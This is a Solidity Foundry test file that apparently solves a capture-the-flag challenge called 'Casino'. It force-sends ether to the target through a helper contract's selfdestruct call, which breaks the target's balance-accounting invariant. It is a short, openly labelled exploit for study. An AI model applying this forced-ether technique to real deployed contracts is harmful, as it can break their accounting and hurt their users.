// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

import "forge-std/Test.sol";
import "../contracts/Casino.sol";
import "../contracts/Setup.sol";

/**
The challenge just requires the Casino balance to not match (be greater than) the state variables that store ETH sent to it; i.e, rewards, jackpot, etc.

Forcibly sending ETH through `selfdestruct()` is enough to pass the challenge
 */
contract CasinoTest is Test {
    Casino casino;
    Setup setup;

    function setUp() external {
        setup = new Setup();
        casino = setup.casino();
    }

    function testAttack() external {
        // Attack
        (new EthSender()).sendFund{value: 1 ether}(address(casino));

        // Check attack success
        require(setup.isSolved(), "NOT SOLVED");
    }
}

contract EthSender {
    function sendFund(address _recipient) external payable {
        selfdestruct(payable(_recipient));
    }
}
